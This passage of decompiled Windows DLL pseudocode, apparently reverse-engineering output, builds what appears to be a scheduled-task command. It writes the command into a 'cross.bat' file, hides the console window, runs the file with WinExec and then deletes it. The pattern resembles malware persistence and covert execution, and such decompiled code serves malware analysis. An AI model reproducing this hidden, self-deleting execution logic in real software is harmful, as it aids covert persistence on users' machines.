    "    if ( v14 >= (unsigned int)L\"\" || v14 + 2 * v13 < (unsigned int)L\"\\\\\" )",
    "    {",
    "      v15 = 1;",
    "    }",
    "    else if ( v14 > (unsigned int)L\"\\\\\" )",
    "    {",
    "      v15 = (int)(v14 - (_DWORD)L\"\\\\\") >> 1;",
    "    }",
    "    else",
    "    {",
    "      v15 = 0;",
    "    }",
    "    memmove((void *)(v14 + 2), (const void *)v14, 2 * v240 + 2);",
    "    v16 = 2 * v15;",
    "    memmove(v241, L\"\\\\\", v16);",
    "    memmove((char *)v241 + v16, &psz[v16 / 2 + 1], 2 - v16);",
    "  }",
    "  *(_OWORD *)Src = *(_OWORD *)v11;",
    "  *(_QWORD *)v260 = *((_QWORD *)v11 + 2);",
    "  v11[4] = 0;",
    "  v11[5] = 7;",
    "  *(_WORD *)v11 = 0;",
    "  LOBYTE(v306) = 5;",
    "  if ( v298 > 7 )",
    "  {",
    "    v17 = Block[0];",
    "    v18 = 2 * v298 + 2;",
    "    if ( v18 >= 0x1000 )",
    "    {",
    "      v17 = (void *)*((_DWORD *)Block[0] - 1);",
    "      v18 = 2 * v298 + 37;",
    "      if ( (unsigned int)((char *)Block[0] - (char *)v17 - 4) > 0x1F )",
    "        _invalid_parameter_noinfo_noreturn();",
    "    }",
    "    v238 = v18;",
    "    sub_100154EB(v17);",
    "  }",
    "  v19 = v294;",
    "  v20 = Src;",
    "  v21 = v260[0];",
    "  LOWORD(Block[0]) = 0;",
    "  if ( v260[1] > 7u )",
    "    v20 = (void **)Src[0];",
    "  v297 = 0;",
    "  v298 = 7;",
    "  v240 = v294;",
    "  if ( v260[0] > v295 - v294 )",
    "  {",
    "    LOBYTE(v240) = 0;",
    "    sub_100116D0(v293, v260[0], v240, (int)v20, v260[0]);",
    "  }",
    "  else",
    "  {",
    "    v22 = v293;",
    "    v294 += v260[0];",
    "    if ( v295 > 7 )",
    "      v22 = (void **)v293[0];",
    "    memmove((char *)v22 + 2 * v19, v20, 2 * v260[0]);",
    "    *((_WORD *)v22 + v21 + v240) = 0;",
    "  }",
    "  v23 = v293;",
    "  if ( v295 > 7 )",
    "    v23 = (void **)v293[0];",
    "  v238 = 0;",
    "  v24 = v293;",
    "  v241 = (char *)v23 + 2 * v294;",
    "  if ( v295 > 7 )",
    "    v24 = (void **)v293[0];",
    "  v25 = (char *)v24 + 2 * v294;",
    "  v26 = v293;",
    "  if ( v295 > 7 )",
    "    v26 = (void **)v293[0];",
    "  v27 = sub_100153B0(v26, v25, v238);",
    "  v28 = v293;",
    "  if ( v295 > 7 )",
    "    v28 = (void **)v293[0];",
    "  v29 = (v27 - (int)v28) >> 1;",
    "  v240 = v294;",
    "  v30 = ((int)v241 - v27) >> 1;",
    "  if ( v294 - v29 < v30 )",
    "    v30 = v294 - v29;",
    "  v31 = v293;",
    "  v241 = (void *)v30;",
    "  if ( v295 > 7 )",
    "    v31 = (void **)v293[0];",
    "  v32 = v294 - (_DWORD)v241;",
    "  memmove((char *)v31 + 2 * v29, (char *)v31 + 2 * v29 + 2 * (_DWORD)v241, 2 * (v294 - (_DWORD)v241 - v29) + 2);",
    "  v294 = v32;",
    "  sub_10009D70((size_t *)&v236, v293);",
    "  sub_1000AD50((int)v249, (WCHAR *)v236, SDWORD1(v236), SDWORD2(v236), SHIDWORD(v236), (int)v237, v238);",
    "  LOBYTE(v306) = 6;",
    "  v300 = 0;",
    "  *(_OWORD *)v299 = 0;",
    "  v301 = 0;",
    "  sub_1000A170(v299, L\"%temp%\", 6u);",
    "  LOBYTE(v306) = 7;",
    "  sub_10009E70(&v230, v239 + 474);",
    "  sub_1000B000(&v236, v230, v231, v232, v233, v234, v235);",
    "  sub_1000AA30((int)v275, (CHAR *)v236, SDWORD1(v236), SDWORD2(v236), SHIDWORD(v236), (int)v237, v238);",
    "  LOBYTE(v306) = 8;",
    "  v33 = v275;",
    "  if ( v277 > 7 )",
    "    v33 = (void **)v275[0];",
    "  v238 = 0;",
    "  v34 = v275;",
    "  v241 = (char *)v33 + 2 * v276;",
    "  if ( v277 > 7 )",
    "    v34 = (void **)v275[0];",
    "  v35 = (char *)v34 + 2 * v276;",
    "  v36 = v275;",
    "  if ( v277 > 7 )",
    "    v36 = (void **)v275[0];",
    "  v37 = sub_100153B0(v36, v35, v238);",
    "  v38 = v275;",
    "  if ( v277 > 7 )",
    "    v38 = (void **)v275[0];",
    "  v39 = (v37 - (int)v38) >> 1;",
    "  v240 = v276;",
    "  v40 = ((int)v241 - v37) >> 1;",
    "  if ( v276 - v39 < v40 )",
    "    v40 = v276 - v39;",
    "  v41 = v275;",
    "  v241 = (void *)v40;",
    "  if ( v277 > 7 )",
    "    v41 = (void **)v275[0];",
    "  v42 = v276 - (_DWORD)v241;",
    "  memmove((char *)v41 + 2 * v39, (char *)v41 + 2 * v39 + 2 * (_DWORD)v241, 2 * (v276 - (_DWORD)v241 - v39) + 2);",
    "  v43 = v300;",
    "  v276 = v42;",
    "  if ( v301 == v300 )",
    "  {",
    "    LOBYTE(v240) = 0;",
    "    sub_100116D0(v299, 1, v240, (int)L\"\\\\\", 1);",
    "  }",
    "  else",
    "  {",
    "    ++v300;",
    "    v44 = v299;",
    "    if ( v301 > 7 )",
    "      v44 = (void **)v299[0];",
    "    *(void **)((char *)v44 + 2 * v43) = (void *)92;",
    "  }",
    "  v45 = v275;",
    "  v46 = v300;",
    "  if ( v277 > 7 )",
    "    v45 = (void **)v275[0];",
    "  v47 = v276;",
    "  v240 = v300;",
    "  if ( v276 > v301 - v300 )",
    "  {",
    "    LOBYTE(v240) = 0;",
    "    sub_100116D0(v299, v276, v240, (int)v45, v276);",
    "  }",
    "  else",
    "  {",
    "    v48 = v299;",
    "    v300 += v276;",
    "    if ( v301 > 7 )",
    "      v48 = (void **)v299[0];",
    "    memmove((char *)v48 + 2 * v46, v45, 2 * v276);",
    "    *((_WORD *)v48 + v47 + v240) = 0;",
    "  }",
    "  v49 = Src;",
    "  v50 = v300;",
    "  if ( v260[1] > 7u )",
    "    v49 = (void **)Src[0];",
    "  v51 = v260[0];",
    "  v240 = v300;",
    "  if ( v260[0] > v301 - v300 )",
    "  {",
    "    LOBYTE(v240) = 0;",
    "    sub_100116D0(v299, v260[0], v240, (int)v49, v260[0]);",
    "  }",
    "  else",
    "  {",
    "    v52 = v299;",
    "    v300 += v260[0];",
    "    if ( v301 > 7 )",
    "      v52 = (void **)v299[0];",
    "    memmove((char *)v52 + 2 * v50, v49, 2 * v260[0]);",
    "    *((_WORD *)v52 + v51 + v240) = 0;",
    "  }",
    "  if ( v300 == 2147483646 )",
    "    sub_10001540();",
    "  v53 = v299;",
    "  v238 = v300;",
    "  if ( v301 > 7 )",
    "    v53 = (void **)v299[0];",
    "  sub_10011850(v278, (int)lpMultiByteStr, v300, (int)L\"\\\"\", 1, (int)v53, v238);",
    "  LOBYTE(v306) = 9;",
    "  v54 = v278;",
    "  if ( v280 > 7 )",
    "    v54 = (void **)v278[0];",
    "  v238 = 0;",
    "  v55 = v278;",
    "  v241 = (char *)v54 + 2 * v279;",
    "  if ( v280 > 7 )",
    "    v55 = (void **)v278[0];",
    "  v56 = (char *)v55 + 2 * v279;",
    "  v57 = v278;",
    "  if ( v280 > 7 )",
    "    v57 = (void **)v278[0];",
    "  v58 = sub_100153B0(v57, v56, v238);",
    "  v59 = v278;",
    "  if ( v280 > 7 )",
    "    v59 = (void **)v278[0];",
    "  v60 = (v58 - (int)v59) >> 1;",
    "  v240 = v279;",
    "  v61 = ((int)v241 - v58) >> 1;",
    "  if ( v279 - v60 < v61 )",
    "    v61 = v279 - v60;",
    "  v62 = v278;",
    "  v241 = (void *)v61;",
    "  if ( v280 > 7 )",
    "    v62 = (void **)v278[0];",
    "  v63 = v279 - (_DWORD)v241;",
    "  memmove((char *)v62 + 2 * v60, (char *)v62 + 2 * v60 + 2 * (_DWORD)v241, 2 * (v279 - (_DWORD)v241 - v60) + 2);",
    "  v64 = v239;",
    "  v279 = v63;",
    "  sub_10009E70(&v230, v239 + 480);",
    "  sub_1000B000(&v236, v230, v231, v232, v233, v234, v235);",
    "  sub_1000AA30((int)&v253._bufsiz, (CHAR *)v236, SDWORD1(v236), SDWORD2(v236), SHIDWORD(v236), (int)v237, v238);",
    "  LOBYTE(v306) = 10;",
    "  p_bufsiz = &v253._bufsiz;",
    "  if ( v255 > 7 )",
    "    p_bufsiz = (int *)v253._bufsiz;",
    "  lpMultiByteStr = (LPCCH)p_bufsiz;",
    "  sub_10009E70(&v230, v64 + 486);",
    "  sub_1000B000(&v236, v230, v231, v232, v233, v234, v235);",
    "  sub_1000AA30((int)v281, (CHAR *)v236, SDWORD1(v236), SDWORD2(v236), SHIDWORD(v236), (int)v237, v238);",
    "  LOBYTE(v306) = 11;",
    "  v66 = v281;",
    "  if ( v283 > 7 )",
    "    v66 = (void **)v281[0];",
    "  v238 = 0;",
    "  v67 = v281;",
    "  v241 = (char *)v66 + 2 * v282;",
    "  if ( v283 > 7 )",
    "    v67 = (void **)v281[0];",
    "  v68 = (char *)v67 + 2 * v282;",
    "  v69 = v281;",
    "  if ( v283 > 7 )",
    "    v69 = (void **)v281[0];",
    "  v70 = sub_100153B0(v69, v68, v238);",
    "  v71 = v281;",
    "  if ( v283 > 7 )",
    "    v71 = (void **)v281[0];",
    "  v72 = (v70 - (int)v71) >> 1;",
    "  v240 = v282;",
    "  v73 = ((int)v241 - v70) >> 1;",
    "  if ( v282 - v72 < v73 )",
    "    v73 = v282 - v72;",
    "  v74 = v281;",
    "  v241 = (void *)v73;",
    "  if ( v283 > 7 )",
    "    v74 = (void **)v281[0];",
    "  v75 = v282 - (_DWORD)v241;",
    "  memmove((char *)v74 + 2 * v72, (char *)v74 + 2 * v72 + 2 * (_DWORD)v241, 2 * (v282 - (_DWORD)v241 - v72) + 2);",
    "  v282 = v75;",
    "  if ( v279 == 2147483646 )",
    "    sub_10001540();",
    "  v76 = v278;",
    "  v238 = 1;",
    "  if ( v280 > 7 )",
    "    v76 = (void **)v278[0];",
    "  sub_10011850(Block, (int)lpMultiByteStr, v279, (int)v76, v279, (int)L\"\\\"\", v238);",
    "  LOBYTE(v306) = 12;",
    "  v77 = v281;",
    "  v78 = v297;",
    "  if ( v283 > 7 )",
    "    v77 = (void **)v281[0];",
    "  v79 = v282;",
    "  v240 = v297;",
    "  if ( v282 > v298 - v297 )",
    "  {",
    "    LOBYTE(v240) = 0;",
    "    v81 = (void **)sub_100116D0(Block, v282, v240, (int)v77, v282);",
    "  }",
    "  else",
    "  {",
    "    v80 = Block;",
    "    v297 += v282;",
    "    if ( v298 > 7 )",
    "      v80 = (void **)Block[0];",
    "    memmove((char *)v80 + 2 * v78, v77, 2 * v282);",
    "    *((_WORD *)v80 + v79 + v240) = 0;",
    "    v81 = Block;",
    "  }",
    "  *(_OWORD *)v244 = *(_OWORD *)v81;",
    "  v245 = *((_QWORD *)v81 + 2);",
    "  v81[4] = 0;",
    "  v81[5] = (void *)7;",
    "  *(_WORD *)v81 = 0;",
    "  LOBYTE(v306) = 14;",
    "  if ( v298 > 7 )",
    "  {",
    "    v82 = Block[0];",
    "    v83 = 2 * v298 + 2;",
    "    if ( v83 >= 0x1000 )",
    "    {",
    "      v82 = (void *)*((_DWORD *)Block[0] - 1);",
    "      v83 = 2 * v298 + 37;",
    "      if ( (unsigned int)((char *)Block[0] - (char *)v82 - 4) > 0x1F )",
    "        _invalid_parameter_noinfo_noreturn();",
    "    }",
    "    v238 = v83;",
    "    sub_100154EB(v82);",
    "  }",
    "  v297 = 0;",
    "  LOWORD(Block[0]) = 0;",
    "  v298 = 7;",
    "  sub_10009D70((size_t *)&v236, v244);",
    "  sub_1000AD50((int)v284, (WCHAR *)v236, SDWORD1(v236), SDWORD2(v236), SHIDWORD(v236), (int)v237, v238);",
    "  LOBYTE(v306) = 15;",
    "  v84 = v284;",
    "  if ( v286 > 0xF )",
    "    v84 = (void **)v284[0];",
    "  v241 = (char *)v84 + v285;",
    "  v85 = v284;",
    "  if ( v286 > 0xF )",
    "    v85 = (void **)v284[0];",
    "  v86 = (char *)v85 + v285;",
    "  v87 = v284;",
    "  v238 = 0;",
    "  v237 = v86;",
    "  if ( v286 > 0xF )",
    "    v87 = (void **)v284[0];",
    "  v88 = sub_100153A0(v87, v237, v238);",
    "  v89 = v284;",
    "  if ( v286 > 0xF )",
    "    v89 = (void **)v284[0];",
    "  v90 = v88 - (_DWORD)v89;",
    "  v91 = (char *)v241 - v88;",
    "  v240 = v285;",
    "  if ( (char *)(v285 - v90) < (char *)v241 - v88 )",
    "    v91 = (char *)(v285 - v90);",
    "  v241 = v91;",
    "  v92 = v284;",
    "  if ( v286 > 0xF )",
    "    v92 = (void **)v284[0];",
    "  v93 = v285 - (_DWORD)v241;",
    "  memmove((char *)v92 + v90, (char *)v241 + (_DWORD)v92 + v90, v285 - (_DWORD)v241 - v90 + 1);",
    "  v285 = v93;",
    "  v238 = 0;",
    "  ConsoleWindow = GetConsoleWindow();",
    "  ShowWindow(ConsoleWindow, v238);",
    "  v236 = 0;",
    "  v237 = 0;",
    "  v238 = 0;",
    "  sub_1000A170(&v236, (void *)lpMultiByteStr, wcslen((const unsigned __int16 *)lpMultiByteStr));",
    "  sub_1000AD50((int)v256, (WCHAR *)v236, SDWORD1(v236), SDWORD2(v236), SHIDWORD(v236), (int)v237, v238);",
    "  LOBYTE(v306) = 16;",
    "  sub_10009E70(&v236, v239 + 390);",
    "  sub_1000B000(v263, (_DWORD *)v236, SDWORD1(v236), SDWORD2(v236), SHIDWORD(v236), (unsigned int)v237, v238);",
    "  LOBYTE(v306) = 17;",
    "  v95 = v263;",
    "  if ( v265 > 0xF )",
    "    v95 = (void **)v263[0];",
    "  v241 = (char *)v95 + (_DWORD)v264;",
    "  v96 = v263;",
    "  if ( v265 > 0xF )",
    "    v96 = (void **)v263[0];",
    "  v97 = &v264[(_DWORD)v96];",
    "  v98 = v263;",
    "  v238 = 0;",
    "  v237 = v97;",
    "  if ( v265 > 0xF )",
    "    v98 = (void **)v263[0];",
    "  v99 = sub_100153A0(v98, v237, v238);",
    "  v100 = v263;",
    "  if ( v265 > 0xF )",
    "    v100 = (void **)v263[0];",
    "  v101 = v99 - (_DWORD)v100;",
    "  v102 = (char *)v241 - v99;",
    "  lpMultiByteStr = v264;",
    "  if ( &v264[-v101] < (char *)v241 - v99 )",
    "    v102 = (CHAR *)&v264[-v101];",
    "  v241 = v102;",
    "  v103 = v263;",
    "  if ( v265 > 0xF )",
    "    v103 = (void **)v263[0];",
    "  v104 = (const CHAR *)(v264 - (_BYTE *)v241);",
    "  memmove((char *)v103 + v101, (char *)v241 + (_DWORD)v103 + v101, v264 - (_BYTE *)v241 - v101 + 1);",
    "  v264 = v104;",
    "  sub_10009E70(&v236, v239 + 540);",
    "  sub_1000B000(v287, (_DWORD *)v236, SDWORD1(v236), SDWORD2(v236), SHIDWORD(v236), (unsigned int)v237, v238);",
    "  LOBYTE(v306) = 18;",
    "  v105 = v287;",
    "  if ( v289 > 0xF )",
    "    v105 = (void **)v287[0];",
    "  v241 = (char *)v105 + v288;",
    "  v106 = v287;",
    "  if ( v289 > 0xF )",
    "    v106 = (void **)v287[0];",
    "  v107 = (char *)v106 + v288;",
    "  v108 = v287;",
    "  v238 = 0;",
    "  v237 = v107;",
    "  if ( v289 > 0xF )",
    "    v108 = (void **)v287[0];",
    "  v109 = sub_100153A0(v108, v237, v238);",
    "  v110 = v287;",
    "  if ( v289 > 0xF )",
    "    v110 = (void **)v287[0];",
    "  v111 = v109 - (_DWORD)v110;",
    "  v112 = (char *)v241 - v109;",
    "  lpMultiByteStr = (LPCCH)v288;",
    "  if ( (char *)(v288 - v111) < (char *)v241 - v109 )",
    "    v112 = (char *)(v288 - v111);",
    "  v241 = v112;",
    "  v113 = v287;",
    "  if ( v289 > 0xF )",
    "    v113 = (void **)v287[0];",
    "  v114 = v288 - (_DWORD)v241;",
    "  memmove((char *)v113 + v111, (char *)v241 + (_DWORD)v113 + v111, v288 - (_DWORD)v241 - v111 + 1);",
    "  v288 = v114;",
    "  sub_10009E70(&v236, v239 + 546);",
    "  sub_1000B000(v269, (_DWORD *)v236, SDWORD1(v236), SDWORD2(v236), SHIDWORD(v236), (unsigned int)v237, v238);",
    "  LOBYTE(v306) = 19;",
    "  v115 = v269;",
    "  if ( v271 > 0xF )",
    "    v115 = (void **)v269[0];",
    "  v241 = (char *)v115 + (_DWORD)v270;",
    "  v116 = v269;",
    "  if ( v271 > 0xF )",
    "    v116 = (void **)v269[0];",
    "  v117 = &v270[(_DWORD)v116];",
    "  v118 = v269;",
    "  v238 = 0;",
    "  v237 = v117;",
    "  if ( v271 > 0xF )",
    "    v118 = (void **)v269[0];",
    "  v119 = sub_100153A0(v118, v237, v238);",
    "  v120 = v269;",
    "  if ( v271 > 0xF )",
    "    v120 = (void **)v269[0];",
    "  v121 = v119 - (_DWORD)v120;",
    "  v122 = (char *)v241 - v119;",
    "  lpMultiByteStr = v270;",
    "  if ( &v270[-v121] < (char *)v241 - v119 )",
    "    v122 = (CHAR *)&v270[-v121];",
    "  v241 = v122;",
    "  v123 = v269;",
    "  if ( v271 > 0xF )",
    "    v123 = (void **)v269[0];",
    "  v124 = (const CHAR *)(v270 - (_BYTE *)v241);",
    "  memmove((char *)v123 + v121, (char *)v241 + (_DWORD)v123 + v121, v270 - (_BYTE *)v241 - v121 + 1);",
    "  v270 = v124;",
    "  sub_10009E70(&v236, v239 + 552);",
    "  sub_1000B000(v290, (_DWORD *)v236, SDWORD1(v236), SDWORD2(v236), SHIDWORD(v236), (unsigned int)v237, v238);",
    "  LOBYTE(v306) = 20;",
    "  v125 = v290;",
    "  v126 = v290;",
    "  if ( v292 > 0xF )",
    "    v125 = (void **)v290[0];",
    "  v241 = (char *)v125 + v291;",
    "  v127 = v290;",
    "  if ( v292 > 0xF )",
    "  {",
    "    v126 = (void **)v290[0];",
    "    v127 = (void **)v290[0];",
    "  }",
    "  v128 = sub_100153A0(v126, (char *)v127 + v291, 0);",
    "  v129 = v290;",
    "  if ( v292 > 0xF )",
    "    v129 = (void **)v290[0];",
    "  v130 = v128 - (_DWORD)v129;",
    "  v131 = (char *)v241 - v128;",
    "  lpMultiByteStr = (LPCCH)v291;",
    "  if ( (char *)(v291 - v130) < (char *)v241 - v128 )",
    "    v131 = (char *)(v291 - v130);",
    "  v241 = v131;",
    "  v132 = v290;",
    "  if ( v292 > 0xF )",
    "    v132 = (void **)v290[0];",
    "  v133 = v291 - (_DWORD)v241;",
    "  memmove((char *)v132 + v130, (char *)v241 + (_DWORD)v132 + v130, v291 - (_DWORD)v241 - v130 + 1);",
    "  v291 = v133;",
    "  sub_10009E70(&v236, v239 + 558);",
    "  sub_1000B000(v266, (_DWORD *)v236, SDWORD1(v236), SDWORD2(v236), SHIDWORD(v236), (unsigned int)v237, v238);",
    "  LOBYTE(v306) = 21;",
    "  v134 = v266;",
    "  if ( v268 > 0xF )",
    "    v134 = (void **)v266[0];",
    "  v241 = (char *)v134 + (_DWORD)v267;",
    "  v135 = v266;",
    "  if ( v268 > 0xF )",
    "    v135 = (void **)v266[0];",
    "  v136 = &v267[(_DWORD)v135];",
    "  v137 = v266;",
    "  v238 = 0;",
    "  v237 = v136;",
    "  if ( v268 > 0xF )",
    "    v137 = (void **)v266[0];",
    "  v138 = sub_100153A0(v137, v237, v238);",
    "  v139 = v266;",
    "  if ( v268 > 0xF )",
    "    v139 = (void **)v266[0];",
    "  v140 = v138 - (_DWORD)v139;",
    "  v141 = (char *)v241 - v138;",
    "  lpMultiByteStr = v267;",
    "  if ( &v267[-v140] < (char *)v241 - v138 )",
    "    v141 = (CHAR *)&v267[-v140];",
    "  v241 = v141;",
    "  v142 = v266;",
    "  if ( v268 > 0xF )",
    "    v142 = (void **)v266[0];",
    "  v143 = (const CHAR *)(v267 - (_BYTE *)v241);",
    "  memmove((char *)v142 + v140, (char *)v241 + (_DWORD)v142 + v140, v267 - (_BYTE *)v241 - v140 + 1);",
    "  v267 = v143;",
    "  sub_10009E70(v302, v269);",
    "  LOBYTE(v306) = 22;",
    "  v144 = v303;",
    "  if ( v304 == v303 )",
    "  {",
    "    LOBYTE(lpMultiByteStr) = 0;",
    "    sub_1000A260(v302, 1u, (int)lpMultiByteStr, L\"\\\"\", 1u);",
    "  }",
    "  else",
    "  {",
    "    ++v303;",
    "    v145 = v302;",
    "    if ( v304 > 0xF )",
    "      v145 = (void **)v302[0];",
    "    *(_WORD *)((char *)v145 + v144) = 34;",
    "  }",
    "  v146 = v256;",
    "  if ( v258 > 0xF )",
    "    v146 = (void **)v256[0];",
    "  v147 = Size;",
    "  v148 = v303;",
    "  v238 = Size;",
    "  v237 = (const char *)v146;",
    "  if ( Size > v304 - v303 )",
    "  {",
    "    LOBYTE(lpMultiByteStr) = 0;",
    "    sub_1000A260(v302, Size, (int)lpMultiByteStr, v237, v238);",
    "  }",
    "  else",
    "  {",
    "    v303 += Size;",
    "    v149 = v302;",
    "    if ( v304 > 0xF )",
    "      v149 = (void **)v302[0];",
    "    v150 = (char *)v149 + v148;",
    "    memmove((char *)v149 + v148, v237, v238);",
    "    v150[v147] = 0;",
    "  }",
    "  v151 = v303;",
    "  if ( v304 == v303 )",
    "  {",
    "    LOBYTE(lpMultiByteStr) = 0;",
    "    sub_1000A260(v302, 1u, (int)lpMultiByteStr, L\"\\\"\", 1u);",
    "  }",
    "  else",
    "  {",
    "    ++v303;",
    "    v152 = v302;",
    "    if ( v304 > 0xF )",
    "      v152 = (void **)v302[0];",
    "    *(_WORD *)((char *)v152 + v151) = 34;",
    "  }",
    "  v238 = 5;",
    "  v237 = \" /tr \";",
    "  if ( v304 - v303 < 5 )",
    "  {",
    "    LOBYTE(lpMultiByteStr) = 0;",
    "    sub_1000A260(v302, 5u, (int)lpMultiByteStr, v237, v238);",
    "  }",
    "  else",
    "  {",
    "    v153 = v302;",
    "    if ( v304 > 0xF )",
    "      v153 = (void **)v302[0];",
    "    v154 = (char *)v153 + v303;",
    "    v303 += 5;",
    "    memmove(v154, v237, v238);",
    "    v154[5] = 0;",
    "  }",
    "  v155 = v303;",
    "  if ( v304 == v303 )",
    "  {",
    "    LOBYTE(lpMultiByteStr) = 0;",
    "    sub_1000A260(v302, 1u, (int)lpMultiByteStr, L\"\\\"\", 1u);",
    "  }",
    "  else",
    "  {",
    "    ++v303;",
    "    v156 = v302;",
    "    if ( v304 > 0xF )",
    "      v156 = (void **)v302[0];",
    "    *(_WORD *)((char *)v156 + v155) = 34;",
    "  }",
    "  v157 = v287;",
    "  if ( v289 > 0xF )",
    "    v157 = (void **)v287[0];",
    "  v158 = v288;",
    "  v159 = v303;",
    "  v238 = v288;",
    "  v237 = (const char *)v157;",
    "  if ( v288 > v304 - v303 )",
    "  {",
    "    LOBYTE(lpMultiByteStr) = 0;",
    "    sub_1000A260(v302, v288, (int)lpMultiByteStr, v237, v238);",
    "  }",
    "  else",
    "  {",
    "    v303 += v288;",
    "    v160 = v302;",
    "    if ( v304 > 0xF )",
    "      v160 = (void **)v302[0];",
    "    v161 = (char *)v160 + v159;",
    "    memmove((char *)v160 + v159, v237, v238);",
    "    v161[v158] = 0;",
    "  }",
    "  v162 = v303;",
    "  if ( v304 == v303 )",
    "  {",
    "    LOBYTE(lpMultiByteStr) = 0;",
    "    sub_1000A260(v302, 1u, (int)lpMultiByteStr, \" \", 1u);",
    "  }",
    "  else",
    "  {",
    "    ++v303;",
    "    v163 = v302;",
    "    if ( v304 > 0xF )",
    "      v163 = (void **)v302[0];",
    "    *(_WORD *)((char *)v163 + v162) = 32;",
    "  }",
    "  v164 = v284;",
    "  if ( v286 > 0xF )",
    "    v164 = (void **)v284[0];",
    "  v165 = v285;",
    "  v166 = v303;",
    "  v238 = v285;",
    "  v237 = (const char *)v164;",
    "  if ( v285 > v304 - v303 )",
    "  {",
    "    LOBYTE(lpMultiByteStr) = 0;",
    "    sub_1000A260(v302, v285, (int)lpMultiByteStr, v237, v238);",
    "  }",
    "  else",
    "  {",
    "    v303 += v285;",
    "    v167 = v302;",
    "    if ( v304 > 0xF )",
    "      v167 = (void **)v302[0];",
    "    v168 = (char *)v167 + v166;",
    "    memmove((char *)v167 + v166, v237, v238);",
    "    v168[v165] = 0;",
    "  }",
    "  v169 = v303;",
    "  if ( v304 == v303 )",
    "  {",
    "    LOBYTE(lpMultiByteStr) = 0;",
    "    sub_1000A260(v302, 1u, (int)lpMultiByteStr, L\"\\\"\", 1u);",
    "  }",
    "  else",
    "  {",
    "    ++v303;",
    "    v170 = v302;",
    "    if ( v304 > 0xF )",
    "      v170 = (void **)v302[0];",
    "    *(_WORD *)((char *)v170 + v169) = 34;",
    "  }",
    "  v171 = v303;",
    "  if ( v304 == v303 )",
    "  {",
    "    LOBYTE(lpMultiByteStr) = 0;",
    "    sub_1000A260(v302, 1u, (int)lpMultiByteStr, \" \", 1u);",
    "  }",
    "  else",
    "  {",
    "    ++v303;",
    "    v172 = v302;",
    "    if ( v304 > 0xF )",
    "      v172 = (void **)v302[0];",
    "    *(_WORD *)((char *)v172 + v171) = 32;",
    "  }",
    "  v173 = v290;",
    "  if ( v292 > 0xF )",
    "    v173 = (void **)v290[0];",
    "  v174 = v291;",
    "  v175 = v303;",
    "  v238 = v291;",
    "  v237 = (const char *)v173;",
    "  if ( v291 > v304 - v303 )",
    "  {",
    "    LOBYTE(lpMultiByteStr) = 0;",
    "    sub_1000A260(v302, v291, (int)lpMultiByteStr, v237, v238);",
    "  }",
    "  else",
    "  {",
    "    v303 += v291;",
    "    v176 = v302;",
    "    if ( v304 > 0xF )",
    "      v176 = (void **)v302[0];",
    "    v177 = (char *)v176 + v175;",
    "    memmove((char *)v176 + v175, v237, v238);",
    "    v177[v174] = 0;",
    "  }",
    "  if ( 0x7FFFFFFF - v273 < 0xA )",
    "    sub_10001540();",
    "  v178 = PathName;",
    "  v238 = 10;",
    "  if ( v274 > 0xF )",
    "    v178 = *(CHAR **)PathName;",
    "  sub_1000A6C0(lpCmdLine, (int)lpMultiByteStr, v273, v178, v273, \"\\\\cross.bat\", v238);",
    "  LOBYTE(v306) = 23;",
    "  lpMultiByteStr = (LPCCH)&v236;",
    "  sub_10009E70(&v236, v302);",
    "  LOBYTE(v306) = 24;",
    "  sub_10009E70(&v230, lpCmdLine);",
    "  LOBYTE(v306) = 23;",
    "  sub_1000C310(",
    "    v230,",
    "    v231,",
    "    v232,",
    "    v233,",
    "    v234,",
    "    v235,",
    "    (_DWORD *)v236,",
    "    SDWORD1(v236),",
    "    SDWORD2(v236),",
    "    SHIDWORD(v236),",
    "    (int)v237,",
    "    v238);",
    "  Sleep(0x7D0u);",
    "  v238 = 0;",
    "  v179 = GetConsoleWindow();",
    "  ShowWindow(v179, v238);",
    "  v180 = (const CHAR *)lpCmdLine;",
    "  v238 = 0;",
    "  if ( v262 > 0xF )",
    "    v180 = lpCmdLine[0];",
    "  WinExec(v180, v238);",
    "  Sleep(0x3E8u);",
    "  v181 = (const CHAR *)lpCmdLine;",
    "  if ( v262 > 0xF )",
    "    v181 = lpCmdLine[0];",
    "  DeleteFileA(v181);",
    "  v297 = 0;",
    "  v298 = 0;",
    "  *(_OWORD *)Block = 0;",
    "  sub_1000A170(Block, Filename, wcslen(Filename));",
    "  LOBYTE(v306) = 25;",
    "  sub_10009D70((size_t *)&v236, Block);",
    "  sub_1000AD50((int)v251, (WCHAR *)v236, SDWORD1(v236), SDWORD2(v236), SHIDWORD(v236), (int)v237, v238);",
    "  LOBYTE(v306) = 26;",
    "  sub_10009E70(&v236, v251);",
    "  sub_1000B270(&v253, (char *)v236, SDWORD1(v236), SDWORD2(v236), SHIDWORD(v236), (int)v237, v238);",
    "  LOBYTE(v306) = 27;",
    "  lpMultiByteStr = (LPCCH)&v236;",
    "  sub_10009E70(&v236, &v253);",
    "  LOBYTE(v306) = 28;",
    "  sub_10009E70(&v230, v249);",
    "  LOBYTE(v306) = 27;",
    "  sub_1000C310(",
    "    v230,",
    "    v231,",
    "    v232,",
    "    v233,",
    "    v234,",
    "    v235,",
    "    (_DWORD *)v236,",
    "    SDWORD1(v236),",
    "    SDWORD2(v236),",
    "    SHIDWORD(v236),",
    "    (int)v237,",
    "    v238);",
    "  if ( v253._charbuf > 0xFu )",
    "  {",
    "    ptr = v253._ptr;",
    "    v183 = v253._charbuf + 1;",
    "    if ( (unsigned int)(v253._charbuf + 1) >= 0x1000 )",
    "    {",
    "      ptr = (char *)*((_DWORD *)v253._ptr - 1);",
    "      v183 = v253._charbuf + 36;",
    "      if ( (unsigned int)(v253._ptr - ptr - 4) > 0x1F )",
    "        goto LABEL_360;",
    "    }",
    "    v238 = v183;",
    "    sub_100154EB(ptr);",
    "  }",
    "  v253._file = 0;",
    "  v253._charbuf = 15;",
    "  LOBYTE(v253._ptr) = 0;",
    "  if ( v252 > 0xF )",
    "  {",
    "    v184 = v251[0];",
    "    v185 = v252 + 1;",
    "    if ( v252 + 1 >= 0x1000 )",
    "    {",
    "      v184 = (void *)*((_DWORD *)v251[0] - 1);",
    "      v185 = v252 + 36;",
    "      if ( (unsigned int)((char *)v251[0] - (char *)v184 - 4) > 0x1F )",
    "        goto LABEL_360;",
    "    }",
    "    v238 = v185;",
    "    sub_100154EB(v184);",
    "  }",
    "  v251[4] = 0;",
    "  v252 = 15;",
    "  LOBYTE(v251[0]) = 0;",
    "  if ( v298 > 7 )",
    "  {",
    "    v186 = Block[0];",
    "    v187 = 2 * v298 + 2;",
    "    if ( v187 >= 0x1000 )",
    "    {",
    "      v186 = (void *)*((_DWORD *)Block[0] - 1);",
    "      v187 = 2 * v298 + 37;",
